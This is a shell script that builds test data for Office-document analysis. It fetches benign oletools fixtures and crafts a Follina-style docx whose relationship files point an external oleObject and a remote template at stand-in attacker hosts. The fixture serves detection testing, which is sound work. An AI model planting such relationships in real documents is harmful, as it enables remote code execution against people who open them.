#!/bin/sh
# Benign Office test fixtures from the oletools project, plus a crafted
# Follina/remote-template sample derived from one of them.
set -eu
cd "$(dirname "$0")/.."
mkdir -p testdata/office
python3 -I tests/mkpdf.py testdata   # clean.pdf, evil.pdf, evil2.pdf, text.pdf
cd testdata/office
B=https://raw.githubusercontent.com/decalage2/oletools/master/tests/test-data
for f in msodde/harmless-clean.docx msodde/harmless-clean.doc msodde/dde-test.docx \
         oleobj/embedded-simple-2007.docx oleobj/external_link/sample_with_external_link_to_doc.docx \
         excel4-macros/excel4_sample_macro.xls olevba/sample_with_vba.ppt; do
    curl -fsSLO "$B/$f"
done
python3 -I - <<'PY'
import zipfile
src = zipfile.ZipFile("harmless-clean.docx")
out = zipfile.ZipFile("follina-template.docx", "w", zipfile.ZIP_DEFLATED)
for n in src.namelist():
    d = src.read(n)
    if n == "word/_rels/document.xml.rels":
        d = d.replace(b"</Relationships>", b'<Relationship Id="rIdX1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://attacker.example/payload.html!x-usc:http://attacker.example/payload.html" TargetMode="External"/></Relationships>')
    out.writestr(n, d)
out.writestr("word/_rels/settings.xml.rels", b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdT1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://templates.attacker.example/invoice.dotm" TargetMode="External"/></Relationships>')
out.close()
PY
